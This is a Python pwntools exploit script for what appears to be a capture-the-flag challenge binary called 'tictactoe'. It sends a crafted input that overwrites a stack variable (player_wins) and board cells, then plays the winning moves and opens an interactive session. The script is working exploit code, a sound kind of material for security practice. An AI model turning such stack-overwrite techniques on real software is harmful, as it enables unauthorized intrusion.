#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('tictactoe')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *0x40121E
b *0x040131F
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def solve():

    """
    First groom the stack to overwrite the player_wins variable to 1
    """

    player_type = b"x"
    board_piece = b"." * 4
    padding = p64(0) * 6
    player_wins = b"\x01" * 9
    
    init_payload = player_type + board_piece  + padding + player_wins
    io.sendline(init_payload)

    """
    Overwrite board[3] to x
    """
    
    second_payload = b"x" * 2 +  b"x..x"
    io.sendline(second_payload)

    """
    Win game
    """

    win = [2, 4, 5]

    for i in win:
        io.sendline(str(i).encode())

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

